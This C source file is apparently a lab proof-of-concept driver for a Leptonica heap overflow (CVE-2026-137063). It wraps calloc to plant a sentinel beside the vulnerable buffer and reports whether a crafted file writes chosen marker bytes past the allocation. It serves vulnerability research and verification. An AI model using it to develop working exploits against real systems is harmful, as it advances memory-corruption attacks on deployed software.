/* Real-library heap-neighborhood probe for CVE-2026-137063.
 *
 * The vulnerable l_byteaCreate() calls calloc(201, 1).  --wrap=calloc lets
 * this lab-only driver place a live 512-byte sentinel immediately after that
 * allocation, before l_byteaInitFromStream() performs its oversized memcpy.
 * No upstream byte is edited; the sentinel and the fault observer are lab
 * mechanics, so any readback is rung-4 mechanics, not rung 5.
 */
#define _GNU_SOURCE
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stddef.h>
#include "allheaders.h"

extern void *__real_calloc(size_t nmemb, size_t size);

static unsigned char *sentinel;
static unsigned char *ba_data;
static const size_t sentinel_size = 512;

void *__wrap_calloc(size_t nmemb, size_t size)
{
    void *p = __real_calloc(nmemb, size);

    if (!sentinel && nmemb == 201 && size == 1) {
        ba_data = (unsigned char *)p;
        sentinel = (unsigned char *)__real_calloc(1, sentinel_size);
        if (sentinel)
            memset(sentinel, 0x5a, sentinel_size);
    }
    return p;
}

static void emit(const char *s)
{
    ssize_t ignored = write(2, s, strlen(s));
    (void)ignored;
}

static void hexdump_label(const char *label, const unsigned char *p, size_t n)
{
    static const char hx[] = "0123456789abcdef";
    char out[256];
    size_t i, k = 0;

    k += (size_t)sprintf(out + k, "%s", label);
    for (i = 0; i < n && k + 2 < sizeof(out); i++) {
        out[k++] = hx[p[i] >> 4];
        out[k++] = hx[p[i] & 15];
    }
    out[k++] = '\n';
    ssize_t ignored = write(2, out, k);
    (void)ignored;
}

static void on_segv(int sig)
{
    char line[128];
    unsigned char *cursor = sentinel;
    size_t i;

    (void)sig;
    sprintf(line, "SIGNAL=SIGSEGV SENTINEL_OFFSET=%td\n",
            sentinel && ba_data ? sentinel - ba_data : (ptrdiff_t)-1);
    emit(line);
    if (cursor) {
        hexdump_label("SENTINEL_FIRST32=", cursor, 32);
        /* Chosen marker can land anywhere in the first 512 bytes; report
         * the first occurrence without relying on libc string functions. */
        for (i = 0; i + 15 <= sentinel_size; i++, cursor++) {
            if (!memcmp(cursor, "MISHE-LEPTONICA", 15)) {
                sprintf(line, "CHOSEN_AT_OFFSET=%zu\n",
                        (size_t)(cursor - sentinel));
                emit(line);
                break;
            }
        }
    }
    _exit(77);
}

int main(int argc, char **argv)
{
    L_BYTEA *ba;
    size_t nbytes = 0;

    if (argc != 2) return 2;
    signal(SIGSEGV, on_segv);
    ba = l_byteaInitFromFile(argv[1]);
    printf("BA=%s\n", ba ? "nonnull" : "NULL");
    if (!ba) return 0;
    l_byteaGetData(ba, &nbytes);
    printf("SIZE=%zu NO_FAULT=1\n", nbytes);
    if (sentinel)
        hexdump_label("SENTINEL_AFTER_CALL=", sentinel, 32);
    l_byteaDestroy(&ba);
    return 0;
}
